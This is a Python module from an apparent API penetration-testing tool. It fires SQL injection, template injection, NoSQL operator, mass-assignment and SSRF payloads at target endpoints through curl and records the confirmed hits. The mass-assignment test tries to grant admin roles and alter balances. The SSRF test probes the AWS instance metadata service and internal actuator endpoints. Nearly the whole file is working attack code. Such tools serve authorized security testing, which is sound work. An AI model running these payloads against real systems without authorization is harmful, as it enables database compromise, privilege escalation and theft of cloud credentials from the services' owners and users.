#!/usr/bin/env python3
"""atest Phase 3: Injection & Logic — SQLi, SSTI, NoSQLi, mass assignment, SSRF on API endpoints.

Usage:
    from phase3_injection import run
    results = run(base_url="https://api.target.com",
                  token="eyJ...",
                  endpoints=[{"method":"POST","path":"/api/search","params":["q"]},
                             {"method":"PUT","path":"/api/users/{id}","body_fields":["name","email"]}])
"""
import json
import re
import time
from hermes_tools import terminal, write_file


def _curl(url, method="GET", headers=None, body=None, timeout=10):
    """Execute curl, return (status_code, body, elapsed_ms)."""
    cmd = f'curl -sk -w "\\n---META:%{{http_code}}|%{{time_total}}---" -X {method} --max-time {timeout}'
    if headers:
        for k, v in headers.items():
            cmd += f' -H "{k}: {v}"'
    if body:
        escaped = body.replace("'", "'\\''")
        cmd += f" -d '{escaped}'"
    cmd += f' "{url}"'
    resp = terminal(cmd, timeout=timeout + 5)
    output = resp.get("output", "")
    meta = re.search(r'---META:(\d+)\|([\d.]+)---', output)
    code = meta.group(1) if meta else "000"
    elapsed = float(meta.group(2)) * 1000 if meta else 0
    body_text = re.sub(r'\n---META:\d+\|[\d.]+---$', '', output)
    return code, body_text, elapsed


SQLI_PAYLOADS = [
    ("' OR '1'='1", "boolean_blind"),
    ("' OR 1=1--", "boolean_blind"),
    ("1' AND SLEEP(3)-- -", "time_blind"),
    ("1; WAITFOR DELAY '0:0:3'--", "time_blind_mssql"),
    ("' UNION SELECT NULL,NULL,NULL--", "union"),
    ("1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "error_based"),
]

SSTI_PAYLOADS = [
    ("{{7*7}}", "49", "jinja2/twig"),
    ("${7*7}", "49", "freemarker"),
    ("#{7*7}", "49", "thymeleaf"),
    ("<%= 7*7 %>", "49", "erb"),
    ("{{constructor.constructor('return 1+1')()}}", "2", "angular/pug"),
]

NOSQL_PAYLOADS = [
    ('{"$gt": ""}', "mongo_bypass"),
    ('{"$ne": null}', "mongo_ne"),
    ('{"$regex": ".*"}', "mongo_regex"),
]

SSRF_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/", "aws_metadata"),
    ("http://127.0.0.1:8080/actuator/env", "internal_actuator"),
    ("http://0.0.0.0:22", "port_scan"),
]


def test_sqli(base_url, endpoint, params, token, auth_header="Authorization", auth_prefix="Bearer"):
    """Test SQL injection on endpoint parameters with confirmation retries."""
    findings = []
    method = endpoint.get("method", "GET")
    path = endpoint.get("path", "")
    url = f"{base_url}{path}"

    # Get baseline response time (3 samples for stable average)
    headers = {auth_header: f"{auth_prefix} {token}", "Content-Type": "application/json"}
    baseline_times = []
    for _ in range(3):
        if method == "GET" and params:
            baseline_url = f"{url}?{params[0]}=test123"
            _, baseline_body, bt = _curl(baseline_url, headers=headers)
        else:
            baseline_body_json = json.dumps({p: "test123" for p in params})
            _, baseline_body, bt = _curl(url, method, headers, baseline_body_json)
        baseline_times.append(bt)
    baseline_time = sum(baseline_times) / len(baseline_times)
    baseline_max = max(baseline_times)

    # WAF detection: check if payloads get blocked
    waf_test_payload = "' OR '1'='1"
    if method == "GET" and params:
        _, waf_body, _ = _curl(f"{url}?{params[0]}={waf_test_payload}", headers=headers)
    else:
        _, waf_body, _ = _curl(url, method, headers, json.dumps({params[0]: waf_test_payload}) if params else '{"q":"\'"}')
    waf_signatures = ["blocked", "forbidden", "waf", "firewall", "security", "cloudflare",
                      "access denied", "request blocked", "not acceptable"]
    is_waf_present = any(sig in waf_body.lower() for sig in waf_signatures)
    if is_waf_present:
        print(f"    ⚡ WAF detected — adjusting detection thresholds")

    for payload, technique in SQLI_PAYLOADS:
        if technique in ("time_blind", "time_blind_mssql"):
            # Time-based: 3x retry confirmation
            if method == "GET" and params:
                test_url = f"{url}?{params[0]}={payload}"
                make_request = lambda: _curl(test_url, headers=headers)
            else:
                test_body = json.dumps({params[0]: payload}) if params else f'{{"q":"{payload}"}}'
                make_request = lambda: _curl(url, method, headers, test_body)

            code, body, elapsed = make_request()
            threshold = baseline_max + 2500  # Must be 2.5s+ above worst baseline

            if elapsed > threshold:
                # WAF check: if response is a WAF block page, ignore the delay
                if is_waf_present and any(sig in body.lower() for sig in waf_signatures):
                    print(f"    ⚡ Time delay but WAF blocked — false positive, skipping")
                    continue

                # Confirmation: retry 2 more times
                confirm_count = 1
                for retry in range(2):
                    _, retry_body, retry_elapsed = make_request()
                    if retry_elapsed > threshold:
                        confirm_count += 1

                confidence = "high" if confirm_count == 3 else "medium" if confirm_count == 2 else "low"

                if confirm_count >= 2:
                    findings.append({
                        "type": "sqli_time_blind", "severity": "critical",
                        "confidence": confidence,
                        "endpoint": f"{method} {path}", "param": params[0] if params else "body",
                        "payload": payload,
                        "detail": f"Time delay confirmed {confirm_count}/3 attempts. "
                                  f"Avg delay: {elapsed:.0f}ms vs baseline {baseline_time:.0f}ms"
                    })
                    print(f"    🔴 CRITICAL SQLi (time-blind, confidence={confidence}): {method} {path}")
                    return findings
                else:
                    print(f"    ? Time delay inconsistent (1/3) — likely network jitter, skipping")
        else:
            # Boolean/Error/Union
            if method == "GET" and params:
                test_url = f"{url}?{params[0]}={payload}"
                code, body, elapsed = _curl(test_url, headers=headers)
            else:
                test_body = json.dumps({params[0]: payload}) if params else f'{{"q":"{payload}"}}'
                code, body, elapsed = _curl(url, method, headers, test_body)

            # WAF false positive filter: if body matches WAF signature, skip
            if is_waf_present and any(sig in body.lower() for sig in waf_signatures):
                continue

            # Error-based detection
            sql_errors = ["SQL syntax", "mysql", "ORA-", "PG::", "sqlite", "ODBC", "unclosed quotation",
                         "you have an error", "syntax error", "unterminated"]
            if any(err.lower() in body.lower() for err in sql_errors):
                # Confirm it's a real DB error, not a WAF error page mentioning SQL
                if code in ("200", "500") and len(body) < 5000:
                    findings.append({
                        "type": "sqli_error_based", "severity": "high",
                        "confidence": "high",
                        "endpoint": f"{method} {path}", "param": params[0] if params else "body",
                        "payload": payload, "detail": f"SQL error in response (status={code})"
                    })
                    print(f"    🔴 HIGH SQLi (error-based, confidence=high): {method} {path}")
                    return findings

    return findings


def test_ssti(base_url, endpoint, params, token, auth_header="Authorization", auth_prefix="Bearer"):
    """Test Server-Side Template Injection."""
    findings = []
    method = endpoint.get("method", "GET")
    path = endpoint.get("path", "")
    url = f"{base_url}{path}"
    headers = {auth_header: f"{auth_prefix} {token}", "Content-Type": "application/json"}

    for payload, expected, engine in SSTI_PAYLOADS:
        if method == "GET" and params:
            test_url = f"{url}?{params[0]}={payload}"
            code, body, _ = _curl(test_url, headers=headers)
        else:
            test_body = json.dumps({params[0]: payload}) if params else f'{{"q":"{payload}"}}'
            code, body, _ = _curl(url, method, headers, test_body)

        if expected in body and payload not in body:
            findings.append({
                "type": "ssti", "severity": "critical",
                "endpoint": f"{method} {path}", "param": params[0] if params else "body",
                "payload": payload, "engine": engine,
                "detail": f"Template evaluated: {payload} → {expected} (engine: {engine})"
            })
            print(f"    🔴 CRITICAL SSTI: {method} {path} (engine={engine})")
            return findings

    return findings


def test_nosqli(base_url, endpoint, params, token, auth_header="Authorization", auth_prefix="Bearer"):
    """Test NoSQL injection (MongoDB operators)."""
    findings = []
    method = endpoint.get("method", "POST")
    path = endpoint.get("path", "")
    url = f"{base_url}{path}"
    headers = {auth_header: f"{auth_prefix} {token}", "Content-Type": "application/json"}

    # Baseline with normal value
    normal_body = json.dumps({params[0]: "nonexistent_value_12345"}) if params else '{"q":"test"}'
    _, baseline_body, _ = _curl(url, method, headers, normal_body)
    baseline_len = len(baseline_body)

    for payload, technique in NOSQL_PAYLOADS:
        # Inject operator as the parameter value
        if params:
            test_body = json.dumps({params[0]: json.loads(payload)})
        else:
            test_body = f'{{"q": {payload}}}'

        code, body, _ = _curl(url, method, headers, test_body)

        # If response is significantly larger or different status, operator might be evaluated
        if code == "200" and len(body) > baseline_len * 2 and len(body) > 100:
            findings.append({
                "type": "nosqli", "severity": "high",
                "endpoint": f"{method} {path}", "param": params[0] if params else "body",
                "payload": payload, "technique": technique,
                "detail": f"Response size {len(body)} vs baseline {baseline_len} — operator evaluated"
            })
            print(f"    🔴 HIGH NoSQLi: {method} {path} ({technique})")
            return findings

    return findings


def test_mass_assignment(base_url, endpoint, token, auth_header="Authorization", auth_prefix="Bearer"):
    """Test mass assignment by adding privileged fields to update requests."""
    findings = []
    method = endpoint.get("method", "PUT")
    path = endpoint.get("path", "")
    url = f"{base_url}{path}"
    headers = {auth_header: f"{auth_prefix} {token}", "Content-Type": "application/json"}

    if method not in ("PUT", "PATCH", "POST"):
        return findings

    # Privileged fields to inject
    priv_fields = [
        {"role": "admin"},
        {"is_admin": True},
        {"admin": True},
        {"permissions": ["admin", "write", "delete"]},
        {"verified": True},
        {"balance": 99999},
        {"price": 0},
        {"discount": 100},
    ]

    for field in priv_fields:
        test_body = json.dumps(field)
        code, body, _ = _curl(url, method, headers, test_body)
        if code in ("200", "201"):
            # Check if the field was accepted by reading back
            get_code, get_body, _ = _curl(url.replace("/" + url.split("/")[-1], ""), "GET", headers)
            for k, v in field.items():
                if str(v).lower() in get_body.lower():
                    findings.append({
                        "type": "mass_assignment", "severity": "high",
                        "endpoint": f"{method} {path}", "field": k,
                        "detail": f"Privileged field '{k}' accepted and persisted"
                    })
                    print(f"    🔴 HIGH Mass Assignment: {method} {path} → field '{k}' accepted")

    return findings


def test_ssrf(base_url, endpoint, params, token, auth_header="Authorization", auth_prefix="Bearer"):
    """Test SSRF on URL-like parameters."""
    findings = []
    method = endpoint.get("method", "POST")
    path = endpoint.get("path", "")
    url = f"{base_url}{path}"
    headers = {auth_header: f"{auth_prefix} {token}", "Content-Type": "application/json"}

    # Only test params that look like they take URLs
    url_params = [p for p in params if any(k in p.lower() for k in
                  ["url", "uri", "link", "href", "src", "dest", "redirect", "callback", "webhook", "image", "fetch"])]
    if not url_params:
        return findings

    for param in url_params:
        for payload, target_type in SSRF_PAYLOADS:
            test_body = json.dumps({param: payload})
            code, body, elapsed = _curl(url, method, headers, test_body)
            # AWS metadata signature
            if "ami-id" in body or "instance-id" in body or "security-credentials" in body:
                findings.append({
                    "type": "ssrf", "severity": "critical",
                    "endpoint": f"{method} {path}", "param": param,
                    "payload": payload, "detail": "AWS metadata accessible via SSRF"
                })
                print(f"    🔴 CRITICAL SSRF: {method} {path} param={param} → AWS metadata!")
                return findings
            # Internal service response
            if code == "200" and target_type == "internal_actuator" and "status" in body:
                findings.append({
                    "type": "ssrf", "severity": "high",
                    "endpoint": f"{method} {path}", "param": param,
                    "payload": payload, "detail": "Internal service accessible"
                })
                print(f"    🔴 HIGH SSRF: {method} {path} → internal service reachable")

    return findings


def run(base_url, token, endpoints, auth_header="Authorization", auth_prefix="Bearer",
        output_dir="./atest-output/phase3-injection"):
    """
    Full Phase 3 injection testing pipeline.

    Args:
        base_url: API base URL
        token: Auth token
        endpoints: list of {"method": str, "path": str, "params": [str], "body_fields": [str]}
        output_dir: Where to write results
    """
    print("=" * 60)
    print("atest Phase 3: Injection & Logic Testing")
    print(f"  Base: {base_url}")
    print(f"  Endpoints: {len(endpoints)}")
    print("=" * 60)

    all_findings = []

    for ep in endpoints:
        params = ep.get("params", []) or ep.get("body_fields", [])
        if not params:
            continue

        print(f"\n  [{ep.get('method','GET')}] {ep.get('path','')}")

        # SQLi
        sqli = test_sqli(base_url, ep, params, token, auth_header, auth_prefix)
        all_findings.extend(sqli)

        # SSTI
        ssti = test_ssti(base_url, ep, params, token, auth_header, auth_prefix)
        all_findings.extend(ssti)

        # NoSQLi (only on POST/PUT with body params)
        if ep.get("method", "").upper() in ("POST", "PUT", "PATCH"):
            nosqli = test_nosqli(base_url, ep, params, token, auth_header, auth_prefix)
            all_findings.extend(nosqli)

        # Mass Assignment (only on update endpoints)
        if ep.get("method", "").upper() in ("PUT", "PATCH", "POST"):
            mass = test_mass_assignment(base_url, ep, token, auth_header, auth_prefix)
            all_findings.extend(mass)

        # SSRF (on URL-accepting params)
        ssrf = test_ssrf(base_url, ep, params, token, auth_header, auth_prefix)
        all_findings.extend(ssrf)

    # Summary
    print(f"\n{'='*60}")
    print(f"RESULTS: {len(all_findings)} findings")
    by_type = {}
    for f in all_findings:
        by_type.setdefault(f["type"], []).append(f)
    for t, items in by_type.items():
        print(f"  {t}: {len(items)}")

    # Apply confidence scoring
    try:
        from confidence import score_finding, summary_with_confidence
        for f in all_findings:
            if "confidence" not in f:
                f["confidence"] = score_finding(f)
        conf_summary = summary_with_confidence(all_findings)
        print(f"\n  Confidence breakdown:")
        print(f"    High (submit-ready): {conf_summary['high_confidence']}")
        print(f"    Medium (verify first): {conf_summary['medium_confidence']}")
        print(f"    Low (likely FP): {conf_summary['low_confidence']}")
    except ImportError:
        pass

    terminal(f"mkdir -p {output_dir}", timeout=5)
    write_file(f"{output_dir}/injection-findings.json", json.dumps(all_findings, indent=2))

    return {"findings": all_findings, "by_type": {k: len(v) for k, v in by_type.items()}}


if __name__ == "__main__":
    pass
